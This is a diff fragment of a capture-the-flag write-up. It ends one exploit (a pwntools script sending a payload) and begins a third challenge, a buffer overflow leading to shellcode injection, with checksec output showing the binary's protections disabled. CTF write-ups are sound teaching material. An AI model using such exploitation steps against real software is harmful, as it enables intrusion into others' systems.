@@ -104,3 +104,15 @@ The padding or the offset + the value we have to overwrite local_c with  in litt
   p.sendline(payload)
   print(p.clean())
 ```
+## Third Challenge (Escape the Jail): Buffer Overflow that Leads to Shellcode Injection
+as usual, we start by checking the binary security to get an overview of the possible attacks :
+```console
+checksec escape_the_jail
+[*] '/home/elmentos/Desktop/Romdhan_CTF_TASKS/escape_the_jail(Done)/to_host/escape_the_jail'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+```
